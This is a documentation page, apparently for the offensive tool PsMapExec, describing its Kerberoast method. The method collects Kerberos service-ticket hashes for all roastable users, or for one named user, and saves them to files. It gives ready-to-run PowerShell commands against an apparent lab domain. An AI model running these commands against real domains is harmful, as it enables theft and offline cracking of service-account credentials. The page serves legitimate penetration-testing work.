# Kerberoast

PsMapExec will now perform kerberoasting. By default, all kerberoastable users are obtained and written to file. All hashes are output to file and split into each file depending on the associated encryption.

Output is stored in: `$PWD\PME\Kerberoast`

### Optional Parameters

<table><thead><tr><th width="174">Parameter</th><th width="164">Value</th><th>Description</th></tr></thead><tbody><tr><td>-Domain</td><td>Domain</td><td>Set the Domain for which to run against</td></tr><tr><td>-Option</td><td>Kerberoast:USER</td><td>Specify a single user to roast than than all candidate users</td></tr><tr><td>-ShowOutput</td><td>N/A</td><td>Displays hash output to the console</td></tr></tbody></table>

Obtain all Kerberoastable users from target domain

```powershell
PsMapExec -Method kerberoast -Domain north.sevenkingdoms.local
```

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Single user specification

```powershell
PsMapExec -Method Kerberoast -ShowOutput -Option Kerberoast:USER
```

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
